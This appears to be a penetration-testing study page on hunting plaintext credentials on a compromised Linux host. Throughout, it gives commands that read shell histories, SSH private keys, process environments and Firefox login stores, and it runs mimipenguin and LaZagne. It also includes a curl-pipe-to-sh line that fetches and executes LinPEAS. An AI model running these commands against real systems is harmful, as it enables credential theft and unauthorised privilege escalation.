---
title: "Credential Hunting in Linux"
description: "Techniques for finding plaintext passwords hidden in configuration files, history files, SSH keys, and environment variables."
tags:
  - password-attacks
  - credential-hunting
  - linux
  - ssh
  - bash_history
icon: material/linux
---

# 🕵️ Credential Hunting in Linux

If you gain unprivileged access to a Linux machine, your first goal is usually privilege escalation. Finding a forgotten plaintext password is often the fastest route to `root`.

Administrators frequently leave credentials in shell history, configuration files, environment variables, or unprotected SSH keys.

---

## 1️⃣ Hunting in Shell History

The most common mistake users make is passing passwords as command-line arguments (e.g., `mysql -u root -pPassword123`). These commands are saved in the user's shell history file.

### Examining History Files
```bash
# Check the Bash history
cat ~/.bash_history

# Check other common history files
cat ~/.zsh_history
cat ~/.mysql_history
cat ~/.psql_history
cat ~/.python_history
```

If you are root and want to check the history of *all* users:
```bash
cat /home/*/.bash_history
```

---

## 2️⃣ Hunting in Configuration Files

Many services require plaintext credentials to connect to databases or APIs. These are often stored in configuration files within the user's home directory or in `/etc/`.

### Searching for Passwords
You can use `grep` to search recursively for keywords in known directories:

```bash
# Search the current directory and subdirectories for 'password' or 'pass'
grep -riE 'password|pass|pwd' .

# If you have access to /etc/, search it
grep -riE 'password|pass|pwd' /etc/
```

To hunt down configuration files spread across the entire file system (excluding noisy directories like libraries and fonts), you can use this handy one-liner loop:

```bash
# Find all .conf, .config, and .cnf files across the system
for l in $(echo ".conf .config .cnf"); do echo -e "\nFile extension: " $l; find / -name *$l 2>/dev/null | grep -v "lib\|fonts\|share\|core"; done
```

### Common Files to Check
- **WordPress:** `wp-config.php`
- **Apache/Nginx config files:** `/etc/apache2/`, `/etc/nginx/`
- **OpenVPN configs:** `*.ovpn`
- **WPA Supplicant (Wi-Fi passwords):** `/etc/wpa_supplicant/wpa_supplicant.conf`
- **Network Manager (Wi-Fi passwords):** `/etc/NetworkManager/system-connections/`

### Advanced File Hunting Scripts

You can use these targeted one-liners to sweep the filesystem for specific types of sensitive files, filtering out standard system directories to reduce noise.

**Find Database Files:**
```bash
for l in $(echo ".sql .db .*db .db*"); do echo -e "\nDB File extension: " $l; find / -name *$l 2>/dev/null | grep -v "doc\|lib\|headers\|share\|man"; done
```

**Find Scripts and Source Code (which often contain hardcoded credentials):**
```bash
for l in $(echo ".py .pyc .pl .go .jar .c .sh"); do echo -e "\nFile extension: " $l; find / -name *$l 2>/dev/null | grep -v "doc\|lib\|headers\|share"; done
```

**Find all Text Files in Home Directories (excluding hidden files):**
```bash
find /home/* -type f -name "*.txt" -o ! -name "*.*"
```

---

## 3️⃣ Hunting for SSH Keys

An unprotected SSH private key is just as good as a password. If you find one, you can use it to log in to other machines on the network.

### Finding Private Keys
```bash
# Look in the default SSH directory
ls -la ~/.ssh/

# Look for the standard private key files
cat ~/.ssh/id_rsa
cat ~/.ssh/id_ed25519
```

If you find a private key, check the `.ssh/config` file or `known_hosts` to see which servers the user connects to.

```bash
cat ~/.ssh/config
cat ~/.ssh/known_hosts
```

If the `id_rsa` file is encrypted (it asks for a passphrase), you can extract the hash and attempt to crack it offline using John the Ripper (see [Cracking Protected Files](cracking-protected-files.md)).

---

## 4️⃣ Hunting in Environment Variables

Applications (especially Docker containers and cloud-native apps) frequently read credentials from environment variables.

```bash
# View all environment variables for the current session
env
printenv

# Look specifically for sensitive variables
env | grep -iE 'pass|key|secret|token'
```

If you want to view the environment variables of a *running process* (requires appropriate permissions):
```bash
# View env vars for a process with PID 1234
cat /proc/1234/environ | tr '\0' '\n'
```

---

## 5️⃣ Hunting in Scheduled Tasks (Cron)

Administrators often schedule scripts that run with elevated privileges (like root) to perform backups or database maintenance. These scripts frequently contain hardcoded passwords or database connection strings.

Check the system-wide crontab and the individual cron directories:

```bash
# View the main crontab
cat /etc/crontab

# List all scripts in the hourly, daily, weekly, and monthly cron directories
ls -la /etc/cron.*/
```

If you find a script running as root that you have read access to, review it for credentials.

---

## 6️⃣ Extracting Credentials from Browsers

If the compromised user uses a graphical interface (like a VNC session or a desktop environment), their web browser is a prime target for saved passwords.

### Extracting from Firefox
Firefox stores saved logins in `logins.json` (encrypted) and `key4.db` (the key database).

```bash
# Find the default Firefox profile directory
ls -l ~/.mozilla/firefox/ | grep default

# If the user hasn't set a Master Password, you can dump the encrypted JSON structure
cat ~/.mozilla/firefox/*.default-release/logins.json | jq .
```

To decrypt the passwords easily, use **firefox_decrypt**:
```bash
# Download and run firefox_decrypt
python3.9 firefox_decrypt.py ~/.mozilla/firefox/*.default-release/
```

---

## 7️⃣ Memory Dumping for Cleartext Passwords

If you have root privileges but need the plaintext passwords of users currently logged into the system (e.g., to pivot to other machines), you can dump them from memory.

**Mimipenguin** is a tool that dumps the login credentials from the current Linux desktop user (gnome-keyring, lightdm, vsftpd, sshd, etc.).

```bash
# Requires root
sudo python3 mimipenguin.py
```

---

## 8️⃣ Automated Credential Hunting

### LinPEAS
Just like WinPEAS on Windows, **LinPEAS** (Linux Privilege Escalation Awesome Script) automates the search for sensitive files, passwords, and misconfigurations.

```bash
# Download and run LinPEAS
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
```
Pay close attention to the **"Passwords/Tokens"** and **"Interesting Files"** sections in the output.

### LaZagne
**LaZagne** is an open-source project used to retrieve lots of passwords stored on a local computer. Each module has been developed to retrieve passwords of specific software (browsers, databases, emails, etc.).

```bash
# Run all LaZagne modules
python3 laZagne.py all

# Run specifically against browsers (Chrome, Firefox, Opera, etc.)
python3 laZagne.py browsers
```

---

!!! tip
    **Check `/tmp` and `/var/tmp`.** Administrators often create temporary scripts or dump database backups in these world-readable directories and forget to delete them.
